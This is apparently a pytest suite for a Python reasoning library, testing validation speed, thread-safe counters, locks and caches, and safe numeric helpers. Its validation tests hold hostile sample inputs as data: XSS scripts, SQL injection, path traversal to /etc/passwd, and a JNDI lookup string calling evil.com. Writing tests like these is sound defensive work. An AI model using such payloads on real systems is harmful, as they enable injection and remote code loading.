"""
Comprehensive tests for MINOR optimizations (MINOR-008, MINOR-009, MINOR-010).

This test suite verifies that all performance optimizations and edge case fixes
work correctly without breaking existing functionality.
"""

import pytest
import numpy as np
import threading
import time
from typing import List, Any
import re

# Import the modules we're testing
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from reasoning_library.validation import (
    validate_string_list,
    validate_confidence_value,
    safe_divide,
    validate_numeric_sequence,
    _validate_string_confidence
)
from reasoning_library.thread_safety import (
    AtomicCounter,
    TimeoutLock,
    ThreadSafeCache
)
# Import scipy for linear regression
from scipy import stats
from reasoning_library.exceptions import ValidationError


# NumPy-based helper functions to replace custom math module
def safe_divide_arrays(numerator, denominator, default_value=0.0):
    """NumPy equivalent of safe_divide_arrays with edge case handling."""
    numerator = np.array(numerator)
    denominator = np.array(denominator)

    # Handle NaN and infinite values
    numerator_clean = np.where(np.isfinite(numerator), numerator, default_value)
    denominator_clean = np.where(np.isfinite(denominator), denominator, 1.0)

    # Handle near-zero denominator
    with np.errstate(divide='ignore', invalid='ignore'):
        result = np.divide(numerator_clean, denominator_clean)
        result = np.where(np.isclose(denominator_clean, 0) | ~np.isfinite(result), default_value, result)

    return result


def safe_exponential(x):
    """NumPy equivalent of safe_exponential with overflow protection."""
    x_clipped = np.clip(x, -700, 700)  # Prevent overflow/underflow
    with np.errstate(over='ignore', under='ignore'):
        result = np.exp(x_clipped)
    return np.where(np.isfinite(result), result, np.where(x_clipped > 0, np.inf, 0.0))


def safe_logarithm(x, base=np.e):
    """NumPy equivalent of safe_logarithm with domain validation."""
    x = np.array(x)
    x_safe = np.where(x > 0, x, 1e-10)  # Use small positive value for non-positive inputs

    if base == np.e:
        result = np.log(x_safe)
    else:
        result = np.log(x_safe) / np.log(base)

    return np.where(np.isfinite(result), result, 0.0)


def safe_power(base, exponent):
    """NumPy equivalent of safe_power with edge case handling."""
    base = np.array(base)
    exponent = np.array(exponent)

    with np.errstate(invalid='ignore', over='ignore', under='ignore'):
        result = np.power(np.abs(base), exponent)  # Use abs to handle negative bases
        # Handle 0^0 case
        result = np.where((np.abs(base) < 1e-15) & (np.abs(exponent) < 1e-15), 1.0, result)

    return np.where(np.isfinite(result), result, 1.0)


def safe_sqrt(x):
    """NumPy equivalent of safe_sqrt with input validation."""
    x = np.array(x)
    x_safe = np.maximum(x, 0.0)  # Ensure non-negative
    result = np.sqrt(x_safe)
    return np.where(np.isfinite(result), result, 0.0)


def safe_polyval(coefficients, x_values):
    """NumPy equivalent of safe_polyval using Horner's method."""
    coefficients = np.array(coefficients)
    x_values = np.array(x_values)

    # Clean up non-finite values
    coefficients = np.where(np.isfinite(coefficients), coefficients, 0.0)
    x_values = np.where(np.isfinite(x_values), x_values, 0.0)

    # Use numpy's polyval which is already numerically stable
    try:
        result = np.polyval(coefficients, x_values)
        result = np.clip(result, -1e308, 1e308)
        return np.where(np.isfinite(result), result, 0.0)
    except:
        return np.zeros_like(x_values)


def safe_linear_regression(x_values, y_values):
    """NumPy/SciPy equivalent of safe_linear_regression."""
    x_values = np.array(x_values)
    y_values = np.array(y_values)

    # Input validation
    if len(x_values) != len(y_values) or len(x_values) < 2:
        return np.array([0.0, 0.0]), 0.0

    # Clean up non-finite values
    x_clean = np.where(np.isfinite(x_values), x_values, 0.0)
    y_clean = np.where(np.isfinite(y_values), y_values, 0.0)

    # Check for zero variance in x
    x_var = np.var(x_clean)
    if x_var < 1e-15:
        slope = 0.0
        intercept = np.mean(y_clean)
        r_squared = 0.0
        return np.array([slope, intercept]), r_squared

    # Use scipy's linregress for robust calculation
    try:
        slope, intercept, r_value, p_value, std_err = stats.linregress(x_clean, y_clean)
        r_squared = r_value ** 2
        # Clamp RÂ² to [0, 1]
        r_squared = max(0.0, min(1.0, r_squared))
        return np.array([slope, intercept]), r_squared
    except:
        # Fallback to horizontal line
        return np.array([0.0, np.mean(y_clean)]), 0.0


def safe_array_statistics(arr):
    """NumPy equivalent of safe_array_statistics."""
    arr = np.array(arr)

    # Clean up non-finite values
    clean_arr = np.where(np.isfinite(arr), arr, np.nan)

    if len(clean_arr) == 0 or np.all(np.isnan(clean_arr)):
        return {
            'mean': 0.0, 'std': 0.0, 'min': 0.0, 'max': 0.0,
            'median': 0.0, 'count': 0
        }

    # Calculate statistics using nan-safe functions
    finite_values = clean_arr[~np.isnan(clean_arr)]
    if len(finite_values) == 0:
        return {
            'mean': 0.0, 'std': 0.0, 'min': 0.0, 'max': 0.0,
            'median': 0.0, 'count': 0
        }

    mean_val = float(np.nanmean(clean_arr))
    std_val = float(np.nanstd(clean_arr))
    min_val = float(np.nanmin(clean_arr))
    max_val = float(np.nanmax(clean_arr))
    median_val = float(np.nanmedian(clean_arr))

    return {
        'mean': mean_val if np.isfinite(mean_val) else 0.0,
        'std': std_val if np.isfinite(std_val) else 0.0,
        'min': min_val if np.isfinite(min_val) else 0.0,
        'max': max_val if np.isfinite(max_val) else 0.0,
        'median': median_val if np.isfinite(median_val) else 0.0,
        'count': len(finite_values)
    }


def enhanced_validate_numeric_sequence(sequence, param_name="sequence"):
    """NumPy equivalent of enhanced_validate_numeric_sequence."""
    if sequence is None:
        raise ValidationError(f"{param_name} cannot be None")

    try:
        if isinstance(sequence, (list, tuple)):
            array = np.array(sequence, dtype=float)
        elif isinstance(sequence, np.ndarray):
            array = sequence.astype(float, copy=False)
        else:
            raise ValidationError(f"{param_name} must be a list, tuple, or numpy array")
    except (ValueError, TypeError):
        raise ValidationError(f"{param_name} contains non-numeric values")

    if len(array) == 0:
        raise ValidationError(f"{param_name} cannot be empty")

    # Clean up non-finite values
    finite_mask = np.isfinite(array)
    if not np.all(finite_mask):
        finite_count = np.sum(finite_mask)
        if finite_count == 0:
            raise ValidationError(f"{param_name} contains no valid numeric values")
        array = np.where(finite_mask, array, 0.0)

    # Clip extreme values
    array = np.clip(array, -1e100, 1e100)

    return array


class TestMinor008ValidationOptimizations:
    """Test MINOR-008: Validation operations optimizations."""

    def test_regex_pattern_caching(self):
        """Test that regex patterns are cached for performance."""
        # Create test data with dangerous content
        test_data = [
            "normal_string",
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "normal_string_2",
            "../../etc/passwd",
        ]

        # Time the validation with caching (should be fast)
        start_time = time.perf_counter()
        for _ in range(100):  # Multiple iterations to test caching
            result = validate_string_list(test_data, "test_field")
            assert len(result) == 5
        end_time = time.perf_counter()

        # Should complete quickly due to caching
        total_time = end_time - start_time
        assert total_time < 1.0, f"Validation took too long: {total_time:.3f}s"

    def test_confidence_validation_performance(self):
        """Test that confidence validation uses pre-compiled patterns."""
        test_cases = [
            "0.75",  # Valid confidence value
            "0.5",   # Another valid confidence value
            "nan",
            "inf",
            "0x123",
            "0b101",
            "0o777",
            "1e10",
            "normal_value"
        ]

        # Test multiple iterations to verify caching
        for _ in range(10):
            for case in test_cases:
                if case in ["0.75", "0.5"]:
                    result = validate_confidence_value(case)
                    assert 0.0 <= result <= 1.0
                else:
                    # These should raise ValidationError
                    with pytest.raises(ValidationError):
                        validate_confidence_value(case)

    def test_string_validation_edge_cases(self):
        """Test edge cases in string validation."""
        # Test dangerous patterns detection
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "onclick=alert('xss')",
            "; DROP TABLE users;",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]

        for dangerous_input in dangerous_inputs:
            # Should not raise ValidationError but should log security events
            result = validate_string_list([dangerous_input], "test")
            assert len(result) == 1
            assert result[0] == dangerous_input.strip()

    def test_precompiled_patterns_exist(self):
        """Verify that pre-compiled patterns are available."""
        from reasoning_library.validation import _DANGEROUS_PATTERNS, _DANGEROUS_CONFIDENCE_PATTERNS

        assert len(_DANGEROUS_PATTERNS) > 0
        assert len(_DANGEROUS_CONFIDENCE_PATTERNS) > 0

        # Verify they are compiled regex objects
        for pattern in _DANGEROUS_PATTERNS:
            assert isinstance(pattern, re.Pattern)

        for pattern in _DANGEROUS_CONFIDENCE_PATTERNS:
            assert isinstance(pattern, re.Pattern)


class TestMinor009ThreadSafetyEnhancements:
    """Test MINOR-009: Thread safety enhancements."""

    def test_atomic_counter(self):
        """Test AtomicCounter thread safety."""
        counter = AtomicCounter(0)

        def increment_worker():
            for _ in range(1000):
                counter.increment()

        def decrement_worker():
            for _ in range(500):
                counter.decrement()

        # Start multiple threads
        threads = []
        for _ in range(5):
            threads.append(threading.Thread(target=increment_worker))
            threads.append(threading.Thread(target=decrement_worker))

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        # Should be (5*1000) - (5*500) = 2500
        final_value = counter.get()
        assert final_value == 2500

    def test_atomic_counter_compare_and_swap(self):
        """Test AtomicCounter compare-and-swap functionality."""
        counter = AtomicCounter(10)

        # Successful CAS
        assert counter.compare_and_swap(10, 20) == True
        assert counter.get() == 20

        # Failed CAS
        assert counter.compare_and_swap(10, 30) == False
        assert counter.get() == 20

    def test_timeout_lock(self):
        """Test TimeoutLock functionality."""
        lock = TimeoutLock(timeout=0.1, name="test_lock")

        # Test normal acquisition
        assert lock.acquire() == True
        lock.release()

        # Test context manager
        with lock:
            assert True  # Should not timeout

        # Test timeout
        def holder():
            lock.acquire()

        holder_thread = threading.Thread(target=holder)
        holder_thread.start()
        time.sleep(0.05)  # Let holder acquire lock

        # Should timeout
        assert lock.acquire(blocking=True, timeout=0.05) == False

        holder_thread.join()
        lock.release()  # Make sure lock is released

    def test_thread_safe_cache(self):
        """Test ThreadSafeCache functionality."""
        cache = ThreadSafeCache(max_size=10, ttl_seconds=0.1)

        # Test basic operations
        cache.put("key1", "value1")
        assert cache.get("key1") == "value1"
        assert cache.get("nonexistent") is None

        # Test TTL
        cache.put("key2", "value2")
        assert cache.get("key2") == "value2"
        time.sleep(0.2)  # Wait for TTL to expire
        assert cache.get("key2") is None

        # Test cache statistics
        stats = cache.get_stats()
        assert "size" in stats
        assert "hit_rate" in stats
        assert "max_size" in stats
        assert stats["max_size"] == 10

    def test_cache_concurrent_access(self):
        """Test ThreadSafeCache under concurrent access."""
        cache = ThreadSafeCache(max_size=100)

        def worker(worker_id):
            for i in range(100):
                key = f"worker_{worker_id}_key_{i}"
                value = f"worker_{worker_id}_value_{i}"
                cache.put(key, value)
                retrieved = cache.get(key)
                assert retrieved == value

        # Start multiple threads
        threads = []
        for worker_id in range(5):
            threads.append(threading.Thread(target=worker, args=(worker_id,)))

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

        # Verify cache statistics
        stats = cache.get_stats()
        assert stats["size"] <= 100  # Should respect max_size
        assert stats["total_accesses"] > 0


class TestMinor010MathematicalEdgeCases:
    """Test MINOR-010: Mathematical edge case fixes."""

    def test_safe_divide_edge_cases(self):
        """Test enhanced safe_divide with edge cases."""
        # Test normal division
        result = safe_divide(10, 2, "test")
        assert result == 5.0

        # Test division by zero
        result = safe_divide(10, 0, "test")
        assert result == 0.0

        # Test very small denominator
        result = safe_divide(1, 1e-15, "test")
        assert result == 0.0

        # Test with non-numeric types (should raise ValidationError or return 0.0)
        try:
            result = safe_divide("not_a_number", 2, "test")
            # If it doesn't raise an exception, it should return default value
            assert result == 0.0
        except ValidationError:
            # This is also acceptable behavior
            pass

        # Test with NaN values
        result = safe_divide(float('nan'), 2, "test")
        assert result == 0.0

        # Test with infinite values
        result = safe_divide(float('inf'), 2, "test")
        assert result == 0.0

    def test_safe_math_operations(self):
        """Test SafeMathematicalOperations edge case handling."""
        # Test safe_exponential
        result = safe_exponential(0)
        assert result == 1.0
        result = safe_exponential(1)
        assert np.isclose(result, np.e)
        result = safe_exponential(1000)
        # Since we clip to 700, this should be very large but finite
        assert result > 1e300  # Should be very large

        # Test safe_logarithm
        result = safe_logarithm(1)
        assert result == 0.0
        result = safe_logarithm(np.e)
        assert result == 1.0
        result = safe_logarithm(0)
        assert result != float('-inf')  # Should handle edge case gracefully

        # Test safe_power
        result = safe_power(2, 3)
        assert result == 8.0
        result = safe_power(0, 0)
        assert result == 1.0  # Should handle 0^0
        result = safe_power(-2, 2)
        assert result == 4.0  # Should handle negative base

        # Test safe_sqrt
        result = safe_sqrt(4)
        assert result == 2.0
        result = safe_sqrt(0)
        assert result == 0.0
        result = safe_sqrt(-1)
        assert result == 0.0  # Should handle negative input

    def test_safe_array_operations(self):
        """Test array operations with edge case handling."""
        # Test safe_divide_arrays
        numerator = np.array([1.0, 2.0, 3.0, 4.0])
        denominator = np.array([2.0, 0.0, 1e-15, 4.0])
        result = safe_divide_arrays(numerator, denominator)

        expected = np.array([0.5, 0.0, 0.0, 1.0])  # Division by zero should give 0.0
        np.testing.assert_array_almost_equal(result, expected)

        # Test with NaN and infinite values
        numerator = np.array([1.0, np.nan, np.inf, 2.0])
        denominator = np.array([2.0, 2.0, 2.0, 0.0])
        result = safe_divide_arrays(numerator, denominator)

        # All results should be finite
        assert np.all(np.isfinite(result))

    def test_safe_polyval_edge_cases(self):
        """Test safe polynomial evaluation."""
        # Normal case
        coeffs = np.array([1, 2, 1])  # x^2 + 2x + 1
        x_values = np.array([0, 1, 2])
        result = safe_polyval(coeffs, x_values)
        expected = np.array([1, 4, 9])  # (x+1)^2
        np.testing.assert_array_almost_equal(result, expected)

        # Edge case: empty coefficients
        result = safe_polyval(np.array([]), x_values)
        expected = np.zeros_like(x_values)
        np.testing.assert_array_equal(result, expected)

        # Edge case: non-finite values
        coeffs = np.array([np.nan, 2, 1])
        result = safe_polyval(coeffs, x_values)
        assert np.all(np.isfinite(result))

    def test_safe_linear_regression(self):
        """Test safe linear regression with edge cases."""
        # Normal case
        x_values = np.array([1, 2, 3, 4, 5])
        y_values = np.array([2, 4, 6, 8, 10])  # Perfect linear relationship
        coeffs, r_squared = safe_linear_regression(x_values, y_values)

        assert abs(coeffs[0] - 2.0) < 0.01  # Slope should be ~2
        assert abs(coeffs[1]) < 0.01  # Intercept should be ~0
        assert r_squared > 0.99  # Should be very close to 1.0

        # Edge case: zero variance in x
        x_values = np.array([1, 1, 1, 1, 1])
        y_values = np.array([2, 4, 6, 8, 10])
        coeffs, r_squared = safe_linear_regression(x_values, y_values)

        assert coeffs[0] == 0.0  # Slope should be 0
        assert r_squared == 0.0  # R^2 should be 0

        # Edge case: insufficient data
        coeffs, r_squared = safe_linear_regression(np.array([1]), np.array([2]))
        assert len(coeffs) == 2
        assert r_squared == 0.0

    def test_safe_array_statistics(self):
        """Test safe array statistics calculation."""
        # Normal case
        arr = np.array([1, 2, 3, 4, 5])
        stats = safe_array_statistics(arr)

        assert stats['mean'] == 3.0
        assert stats['count'] == 5
        assert stats['min'] == 1.0
        assert stats['max'] == 5.0
        assert stats['median'] == 3.0

        # Edge case: all NaN values
        arr = np.array([np.nan, np.nan, np.nan])
        stats = safe_array_statistics(arr)

        assert stats['mean'] == 0.0
        assert stats['count'] == 0
        assert stats['std'] == 0.0

        # Edge case: mixed finite/non-finite values
        arr = np.array([1, np.nan, 3, np.inf, 5])
        stats = safe_array_statistics(arr)

        assert stats['mean'] == 3.0  # Mean of [1, 3, 5]
        assert stats['count'] == 3

    def test_enhanced_numeric_validation(self):
        """Test enhanced numeric sequence validation."""
        # Normal case
        sequence = [1, 2, 3, 4, 5]
        result = enhanced_validate_numeric_sequence(sequence)
        np.testing.assert_array_equal(result, np.array([1, 2, 3, 4, 5]))

        # Edge case: None input
        with pytest.raises(ValidationError):
            enhanced_validate_numeric_sequence(None)

        # Edge case: empty sequence
        with pytest.raises(ValidationError):
            enhanced_validate_numeric_sequence([])

        # Edge case: non-numeric values
        with pytest.raises(ValidationError):
            enhanced_validate_numeric_sequence([1, 2, "three", 4])

        # Edge case: extreme values
        sequence = [1e200, -1e200, 1e-200, -1e-200]
        result = enhanced_validate_numeric_sequence(sequence)
        assert np.all(np.isfinite(result))

        # Edge case: mixed finite/non-finite values
        sequence = [1, np.nan, 3, np.inf, 5]
        result = enhanced_validate_numeric_sequence(sequence)
        assert len(result) == 5
        assert np.all(np.isfinite(result))
        # NaN and inf should be replaced with 0.0
        assert result[1] == 0.0
        assert result[3] == 0.0


class TestPerformanceBenchmarks:
    """Performance benchmarks for optimizations."""

    def test_validation_performance_improvement(self):
        """Benchmark validation performance improvements."""
        # Create a moderately sized test dataset
        test_data = [f"string_{i}" for i in range(100)]
        # Add some dangerous content
        test_data.extend([
            "<script>alert('xss')</script>",
            "javascript:void(0)",
            "../../etc/passwd"
        ])

        # Benchmark the optimized version
        start_time = time.perf_counter()
        for _ in range(10):
            result = validate_string_list(test_data, "test_field")
            assert len(result) == len(test_data)
        end_time = time.perf_counter()

        total_time = end_time - start_time
        avg_time_per_call = total_time / 10

        # Should be quite fast due to optimizations
        assert avg_time_per_call < 0.01, f"Average validation time too slow: {avg_time_per_call:.4f}s"

    def test_thread_safety_performance(self):
        """Benchmark thread safety utilities performance."""
        cache = ThreadSafeCache(max_size=1000)

        # Benchmark cache operations
        start_time = time.perf_counter()
        for i in range(1000):
            cache.put(f"key_{i}", f"value_{i}")
            cache.get(f"key_{i}")
        end_time = time.perf_counter()

        total_time = end_time - start_time
        assert total_time < 1.0, f"Cache operations too slow: {total_time:.3f}s"

        # Check hit rate
        stats = cache.get_stats()
        assert stats["hit_rate"] > 0.5  # Should have decent hit rate

    def test_mathematical_operations_performance(self):
        """Benchmark mathematical operations with edge case handling."""
        # Create test data
        large_array = np.random.randn(1000)
        denominator_array = np.random.randn(1000) + 0.1  # Ensure mostly non-zero

        # Benchmark safe array division
        start_time = time.perf_counter()
        for _ in range(100):
            result = safe_divide_arrays(large_array, denominator_array)
            assert np.all(np.isfinite(result))
        end_time = time.perf_counter()

        total_time = end_time - start_time
        avg_time = total_time / 100

        # Should be reasonably fast despite safety checks
        assert avg_time < 0.001, f"Safe division too slow: {avg_time:.4f}s"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])